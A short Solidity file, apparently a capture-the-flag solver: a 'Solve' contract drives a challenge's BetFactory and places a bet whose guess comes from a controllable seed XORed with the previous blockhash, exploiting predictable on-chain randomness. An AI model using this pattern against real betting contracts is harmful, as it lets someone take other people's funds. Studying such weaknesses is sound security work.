// SPDX-License-Identifier: MIT
pragma solidity >=0.7.0;

contract BetFactory {
    function create () public payable {}
    function validate (uint token) public {}
}

contract Bet {
    function bet (uint guess) public payable {}
}

contract Solve {
    address target;
    uint private seed;
    function create (address _factory) public payable {
        BetFactory factory = BetFactory(_factory);
        factory.create{value: msg.value}();
    }
    function validate(address _factory, uint token) public {
        BetFactory factory = BetFactory(_factory);
        factory.validate(token);
    }
    function run(address _target) public payable {
        target = _target;
        Bet instance = Bet(target);
        instance.bet{value: msg.value}(getRandom());
    }
    function setSeed(uint seed_) public {
        seed = seed_;
    }
    function getRandom () internal returns(uint) {
        uint rand = seed ^ uint(blockhash(block.number - 1));
        seed ^= block.timestamp;
        return rand;
    }
    receive () external payable {}
}
